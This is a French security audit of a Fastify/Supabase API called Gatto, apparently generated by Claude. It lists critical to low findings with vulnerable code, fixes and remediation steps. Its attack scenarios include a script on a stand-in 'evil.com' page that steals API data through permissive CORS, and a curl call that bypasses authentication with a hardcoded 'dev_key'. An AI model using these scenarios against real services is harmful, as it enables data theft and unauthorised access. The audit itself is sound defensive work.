# 🔒 Audit de Sécurité - Gatto API

**Date**: 2025-01-05
**Version API**: 1.0.0
**Auditeur**: Claude (analyse automatique)

---

## 📊 Résumé Exécutif

### Niveau de Risque Global: 🔴 **CRITIQUE**

| Catégorie | Vulnérabilités |
|-----------|----------------|
| 🔴 **Critiques** | 5 |
| 🟠 **Élevées** | 3 |
| 🟡 **Moyennes** | 4 |
| 🟢 **Faibles** | 2 |

**Recommandation**: Actions immédiates requises avant mise en production.

---

## 🔴 Vulnérabilités CRITIQUES

### 1. 🚨 Secrets Exposés dans Git (CRITIQUE - P0)

**Fichier**: `.env.backup`
**Gravité**: 🔴 **CRITIQUE**
**Impact**: Exposition complète de la base de données

**Description**:
Le fichier `.env.backup` contient les vraies clés Supabase et est **tracké dans git**.

```bash
# Fichier actuellement dans git
.env.backup:
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Impact**:
- ✅ Accès complet à la base de données Supabase
- ✅ Bypass de toutes les RLS policies
- ✅ Lecture/écriture/suppression de toutes les données
- ✅ Exposition dans l'historique git (même si supprimé)

**Solution IMMÉDIATE**:
```bash
# 1. Supprimer du repo
git rm --cached .env.backup
echo ".env.backup" >> .gitignore
git commit -m "security: remove exposed secrets from git"

# 2. RÉGÉNÉRER LES CLÉS SUPABASE IMMÉDIATEMENT
# → Aller sur Supabase Dashboard
# → Project Settings > API
# → Révoquer et régénérer service_role key

# 3. Purger l'historique git (optionnel mais recommandé)
# Utiliser git-filter-repo ou BFG Repo-Cleaner
```

**Statut**: ❌ Non résolu

---

### 2. 🚨 CORS Ouvert en Développement (CRITIQUE - P0)

**Fichier**: `plugins/cors.js:33`
**Gravité**: 🔴 **CRITIQUE**
**Impact**: Vol de données utilisateur, CSRF

**Code vulnérable**:
```javascript
await fastify.register(cors, {
  origin: process.env.NODE_ENV === 'development' ? true : corsOrigins, // ⚠️ DANGER
  credentials: true, // ⚠️ Permet cookies/auth headers
  // ...
});
```

**Impact**:
- ✅ N'importe quel site web peut appeler l'API en développement
- ✅ Avec `credentials: true`, les cookies/tokens sont envoyés
- ✅ Risque de CSRF (Cross-Site Request Forgery)
- ✅ Si déployé en "dev mode" en production = faille critique

**Scénario d'attaque**:
```html
<!-- Site malveillant evil.com -->
<script>
  fetch('http://localhost:3000/v1/pois', {
    credentials: 'include' // Envoie les cookies
  }).then(r => r.json())
    .then(data => {
      // Vol de données
      sendToEvilServer(data);
    });
</script>
```

**Solution**:
```javascript
// plugins/cors.js
const allowedOrigins = process.env.NODE_ENV === 'development'
  ? [...defaultOrigins, ...localOrigins]  // ✅ Liste blanche
  : corsOrigins;

await fastify.register(cors, {
  origin: allowedOrigins, // ✅ Jamais `true`
  credentials: true,
  // ...
});
```

**Statut**: ❌ Non résolu

---

### 3. 🚨 API Complètement Publique (CRITIQUE - P0)

**Gravité**: 🔴 **CRITIQUE**
**Impact**: Abus de ressources, scraping, DDoS

**Description**:
Aucun endpoint n'est protégé par authentification. Le système d'API key existe mais n'est **jamais utilisé**.

```javascript
// plugins/security.js - Code présent mais inutilisé
if (routeConfig && routeConfig.protected) {
  // ⚠️ Aucune route n'a config.protected = true
}
```

**Impact**:
- ✅ N'importe qui peut scraper toute la base de données
- ✅ Pas de contrôle d'accès
- ✅ Abus de ressources (coûts Supabase)
- ✅ Impossible de bloquer des utilisateurs malveillants

**Solution**:
```javascript
// routes/v1/pois.js
fastify.get('/pois', {
  config: { protected: true } // ✅ Activer la protection
}, async (request, reply) => {
  // ...
});
```

**Ou mieux** : Middleware global
```javascript
// server.js
fastify.addHook('onRequest', async (request, reply) => {
  // Routes publiques (whitelist)
  const publicRoutes = ['/health', '/v1'];
  if (publicRoutes.includes(request.url)) return;

  // Vérifier API key pour le reste
  const apiKey = request.headers['x-api-key'];
  if (!apiKey || apiKey !== process.env.API_KEY_PUBLIC) {
    return reply.code(401).send({ error: 'Unauthorized' });
  }
});
```

**Statut**: ❌ Non résolu

---

### 4. 🚨 Authentification Désactivée en Dev (CRITIQUE - P1)

**Fichier**: `plugins/security.js:24-26`
**Gravité**: 🔴 **CRITIQUE**
**Impact**: Bypass complet de sécurité

**Code vulnérable**:
```javascript
// Skip API key validation in development environment
if (process.env.NODE_ENV === 'development') {
  return; // ⚠️ Bypass total de la sécurité
}

// Development fallback - accept common dev keys
const devKeys = ['dev_key', 'development', 'local'];
if (process.env.NODE_ENV !== 'production' && devKeys.includes(apiKey)) {
  return; // ⚠️ Clés hardcodées = backdoor
}
```

**Impact**:
- ✅ Si `NODE_ENV !== 'production'`, la sécurité est désactivée
- ✅ Clés hardcodées connues de tous les développeurs
- ✅ Si déployé en staging/dev, l'API est complètement ouverte

**Scénario d'attaque**:
```bash
# Si le serveur est en NODE_ENV=staging
curl -H "x-api-key: dev_key" https://api-staging.gatto.city/v1/pois
# ✅ Accès complet sans vraie API key
```

**Solution**:
```javascript
// SUPPRIMER ce code
// Toujours vérifier l'API key, même en dev

// Utiliser plutôt des API keys de dev différentes
const apiKey = request.headers['x-api-key'];
const validKeys = process.env.NODE_ENV === 'production'
  ? [process.env.API_KEY_PUBLIC]
  : [process.env.API_KEY_PUBLIC, process.env.API_KEY_DEV];

if (!apiKey || !validKeys.includes(apiKey)) {
  return reply.code(401).send({ error: 'Unauthorized' });
}
```

**Statut**: ❌ Non résolu

---

### 5. 🚨 Service Role Key Exposée au Frontend (CRITIQUE - P0)

**Fichier**: `plugins/supabase.js:12`
**Gravité**: 🔴 **CRITIQUE**
**Impact**: Bypass complet de la sécurité base de données

**Code vulnérable**:
```javascript
const supabase = createClient(supabaseUrl, supabaseServiceKey);
// ⚠️ service_role key bypass TOUTES les RLS policies
```

**Description**:
La `service_role` key est utilisée côté backend, ce qui est correct. **MAIS** si cette clé est exposée (via .env.backup dans git), elle donne un accès admin complet à Supabase.

**Impact**:
- ✅ Lecture/écriture/suppression de TOUTES les tables
- ✅ Bypass de toutes les Row Level Security policies
- ✅ Accès aux données de tous les utilisateurs
- ✅ Impossible de tracer les actions malveillantes

**Solution**:
1. ✅ Régénérer immédiatement la clé (suite à exposition .env.backup)
2. ✅ Ne JAMAIS commiter les clés dans git
3. ✅ Utiliser des variables d'environnement secrets (Fly.io secrets, etc.)
4. ✅ Activer les RLS policies sur Supabase pour limiter les dégâts
5. ✅ Logger toutes les actions avec la service_role key

**Statut**: ❌ Non résolu (clé exposée dans .env.backup)

---

## 🟠 Vulnérabilités ÉLEVÉES

### 6. 🟠 Rate Limiting Trop Permissif (ÉLEVÉ - P1)

**Fichier**: `plugins/rate-limit.js:6`
**Gravité**: 🟠 **ÉLEVÉ**
**Impact**: DDoS, abus de ressources

**Configuration actuelle**:
```javascript
max: 100,           // ⚠️ 100 requêtes
timeWindow: '1 minute'  // par minute = 6000/heure
```

**Impact**:
- ✅ Un seul attaquant peut faire 6000 requêtes/heure
- ✅ 10 IPs = 60 000 requêtes/heure
- ✅ Coûts Supabase explosifs
- ✅ Pas de distinction par endpoint

**Solution**:
```javascript
// Rate limiting différencié par endpoint
await fastify.register(rateLimit, {
  global: true,
  max: async (request, key) => {
    // Endpoints critiques = plus strict
    if (request.url.startsWith('/v1/pois')) {
      return 30; // 30/min pour les POIs
    }
    return 60; // 60/min pour le reste
  },
  timeWindow: '1 minute',
  cache: 10000, // Cache 10k IPs
  allowList: ['127.0.0.1'], // Localhost en dev
  // Redis pour production (shared across instances)
  redis: process.env.REDIS_URL ? new Redis(process.env.REDIS_URL) : null
});
```

**Recommandation**:
- Liste endpoints: 10-20 req/min
- Detail endpoint: 30-50 req/min
- Facets: 5-10 req/min (déjà cached)

**Statut**: ❌ Non résolu

---

### 7. 🟠 Pas de Validation Stricte des Inputs (ÉLEVÉ - P2)

**Gravité**: 🟠 **ÉLEVÉ**
**Impact**: Injection, bugs, crashes

**Description**:
Seul `routes/v1/pois/facets.js` utilise Zod. Les autres routes font de la validation manuelle fragile.

**Code actuel** (`routes/v1/pois.js`):
```javascript
const maxLimit = Math.min(Math.max(parseInt(limit, 10) || 50, 1), 80);
// ⚠️ Validation manuelle fragile
```

**Problèmes**:
- ✅ `parseInt("abc")` = NaN → comportement imprévisible
- ✅ Pas de validation des types de `sort`, `city`, etc.
- ✅ Possibilité d'injection de caractères spéciaux

**Solution avec Zod**:
```javascript
import { z } from 'zod';

const PoisQuerySchema = z.object({
  bbox: z.string().regex(/^-?\d+\.?\d*,-?\d+\.?\d*,-?\d+\.?\d*,-?\d+\.?\d*$/),
  city: z.string().min(1).max(50).regex(/^[a-z0-9-]+$/),
  limit: z.coerce.number().int().min(1).max(80).default(50),
  sort: z.enum(['gatto', 'price_desc', 'price_asc', 'mentions', 'rating']).default('gatto'),
  // ...
});

// Dans la route
fastify.get('/pois', async (request, reply) => {
  try {
    const query = PoisQuerySchema.parse(request.query);
    // ✅ query est maintenant validé et typé
  } catch (error) {
    return reply.code(400).send({
      error: 'Invalid parameters',
      details: error.errors
    });
  }
});
```

**Statut**: ❌ Non résolu

---

### 8. 🟠 Logs Exposent des Informations Sensibles (ÉLEVÉ - P2)

**Fichier**: `plugins/cors.js:26`
**Gravité**: 🟠 **ÉLEVÉ**
**Impact**: Information disclosure

**Code vulnérable**:
```javascript
console.log('🔧 CORS Configuration:', {
  NODE_ENV: process.env.NODE_ENV,
  corsOrigins,  // ⚠️ Expose les domaines autorisés
  localOrigins
});
```

**Impact**:
- ✅ Logs en production peuvent révéler l'architecture
- ✅ `console.log` au lieu de `fastify.log`
- ✅ Pas de contrôle du niveau de logs

**Solution**:
```javascript
// Utiliser fastify.log avec niveaux
fastify.log.debug({ corsOrigins }, 'CORS configured');
// ✅ Ne s'affiche qu'en mode debug

// En production, logger uniquement les erreurs
if (process.env.NODE_ENV === 'production') {
  fastify.log.level = 'warn';
}
```

**Statut**: ❌ Non résolu

---

## 🟡 Vulnérabilités MOYENNES

### 9. 🟡 Pas de HTTPS Forcé (MOYEN - P3)

**Gravité**: 🟡 **MOYEN**
**Impact**: Man-in-the-middle

**Description**:
Aucune vérification que les requêtes arrivent en HTTPS.

**Solution**:
```javascript
// Middleware HTTPS redirect
fastify.addHook('onRequest', async (request, reply) => {
  if (process.env.NODE_ENV === 'production' &&
      request.headers['x-forwarded-proto'] !== 'https') {
    return reply.redirect(301, `https://${request.hostname}${request.url}`);
  }
});
```

**Note**: Fly.io gère déjà ça avec `force_https = true` dans fly.toml.

**Statut**: ✅ Partiellement résolu (via Fly.io)

---

### 10. 🟡 Pas de Timeout sur les Requêtes (MOYEN - P3)

**Gravité**: 🟡 **MOYEN**
**Impact**: Resource exhaustion

**Solution**:
```javascript
// server.js
const fastify = Fastify({
  connectionTimeout: 10000, // 10s
  keepAliveTimeout: 5000,
  requestTimeout: 30000, // 30s max par requête
});
```

**Statut**: ❌ Non résolu

---

### 11. 🟡 Pas de Monitoring de Sécurité (MOYEN - P3)

**Gravité**: 🟡 **MOYEN**
**Impact**: Détection tardive des attaques

**Recommandation**:
```javascript
// Logger les tentatives d'accès non autorisées
fastify.addHook('onResponse', async (request, reply) => {
  if (reply.statusCode === 401 || reply.statusCode === 403) {
    fastify.log.warn({
      ip: request.ip,
      url: request.url,
      userAgent: request.headers['user-agent'],
      statusCode: reply.statusCode
    }, 'Unauthorized access attempt');
  }
});
```

**Outils recommandés**:
- Sentry (erreurs + security events)
- LogTail / Papertrail (logs centralisés)
- Prometheus + Grafana (métriques)

**Statut**: ❌ Non résolu

---

### 12. 🟡 Headers de Sécurité Incomplets (MOYEN - P3)

**Fichier**: `plugins/security.js:5-14`
**Gravité**: 🟡 **MOYEN**
**Impact**: XSS, clickjacking

**Configuration actuelle**:
```javascript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"], // ⚠️ unsafe-inline
    scriptSrc: ["'self'"],
    imgSrc: ["'self'", "data:", "https:"] // ⚠️ https: trop large
  }
}
```

**Problèmes**:
- ✅ `unsafe-inline` dans styleSrc (risque XSS via CSS)
- ✅ `https:` permet toutes les images HTTPS
- ✅ Manque X-Frame-Options, X-Content-Type-Options

**Solution complète**:
```javascript
await fastify.register(helmet, {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https://cuwrsdssoonlwypboarg.supabase.co"],
      connectSrc: ["'self'", "https://cuwrsdssoonlwypboarg.supabase.co"]
    }
  },
  frameguard: { action: 'deny' }, // ✅ Empêche iframe
  noSniff: true, // ✅ X-Content-Type-Options
  hsts: {
    maxAge: 31536000, // ✅ Force HTTPS pendant 1 an
    includeSubDomains: true,
    preload: true
  }
});
```

**Statut**: ⚠️ Partiellement résolu

---

## 🟢 Vulnérabilités FAIBLES

### 13. 🟢 Pas de Limite de Taille de Payload (FAIBLE - P4)

**Solution**:
```javascript
const fastify = Fastify({
  bodyLimit: 1048576, // 1MB max
});
```

**Statut**: ❌ Non résolu

---

### 14. 🟢 Version Node.js Non Fixée (FAIBLE - P4)

**Fichier**: `package.json:27`
**Configuration actuelle**: `"node": ">=18.0.0"`

**Recommandation**:
```json
{
  "engines": {
    "node": "20.x" // ✅ Version fixe
  }
}
```

**Statut**: ❌ Non résolu

---

## ✅ Points Positifs (Bonnes Pratiques)

1. ✅ **Helmet activé** - Headers de sécurité basiques
2. ✅ **CORS configuré** - Protection cross-origin
3. ✅ **Rate limiting activé** - Protection DDoS basique
4. ✅ **Pas de secrets hardcodés** (sauf .env.backup)
5. ✅ **Dockerfile sécurisé** - User non-root, healthcheck
6. ✅ **HTTPS forcé** via Fly.io (fly.toml)
7. ✅ **Compression activée** - Performance
8. ✅ **Logs structurés** avec Fastify

---

## 🛠️ Plan d'Action Prioritaire

### 🔴 URGENT (À faire MAINTENANT)

1. **[CRITIQUE]** Supprimer `.env.backup` de git
   ```bash
   git rm --cached .env.backup
   echo ".env.backup" >> .gitignore
   git commit -m "security: remove exposed secrets"
   git push
   ```

2. **[CRITIQUE]** Régénérer TOUTES les clés Supabase
   - Aller sur Supabase Dashboard
   - Révoquer `service_role` key
   - Générer nouvelle clé
   - Mettre à jour secrets Fly.io

3. **[CRITIQUE]** Corriger CORS
   ```javascript
   origin: allowedOrigins, // Jamais `true`
   ```

4. **[CRITIQUE]** Activer authentification
   ```javascript
   // Protéger TOUS les endpoints /v1/pois
   config: { protected: true }
   ```

### 🟠 Important (Cette semaine)

5. **[ÉLEVÉ]** Ajouter validation Zod sur tous les endpoints
6. **[ÉLEVÉ]** Réduire rate limit à 30 req/min
7. **[ÉLEVÉ]** Supprimer les bypass d'auth en dev

### 🟡 Recommandé (Ce mois)

8. **[MOYEN]** Ajouter monitoring (Sentry)
9. **[MOYEN]** Timeouts sur requêtes
10. **[MOYEN]** Améliorer headers de sécurité

---

## 📋 Checklist de Sécurité

### Avant Production
- [ ] `.env.backup` supprimé de git
- [ ] Clés Supabase régénérées
- [ ] CORS: `origin: true` → `origin: allowedOrigins`
- [ ] Authentification activée sur tous les endpoints
- [ ] Validation Zod sur tous les inputs
- [ ] Rate limit réduit à 30 req/min
- [ ] Bypass d'auth en dev supprimé
- [ ] Logs sensibles supprimés
- [ ] Monitoring activé (Sentry/LogTail)
- [ ] Tests de pénétration effectués

### Maintenance Continue
- [ ] Audit des dépendances `npm audit` (mensuel)
- [ ] Revue des logs de sécurité (hebdomadaire)
- [ ] Rotation des API keys (tous les 6 mois)
- [ ] Tests de charge/DDoS (trimestriel)
- [ ] Revue des accès Supabase (trimestriel)

---

## 🔗 Ressources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Fastify Security Best Practices](https://www.fastify.io/docs/latest/Guides/Security/)
- [Supabase Security](https://supabase.com/docs/guides/platform/security)
- [Mozilla Web Security](https://infosec.mozilla.org/guidelines/web_security)

---

## 📝 Conclusion

L'API présente **5 vulnérabilités critiques** qui doivent être corrigées **immédiatement** avant toute mise en production.

**Priorité absolue**:
1. Supprimer secrets de git et régénérer clés
2. Corriger CORS
3. Activer authentification
4. Ajouter validation stricte

**Temps estimé pour sécurisation complète**: 1-2 jours de développement.

---

**Dernière mise à jour**: 2025-01-05
**Prochaine revue recommandée**: Après correction des vulnérabilités critiques
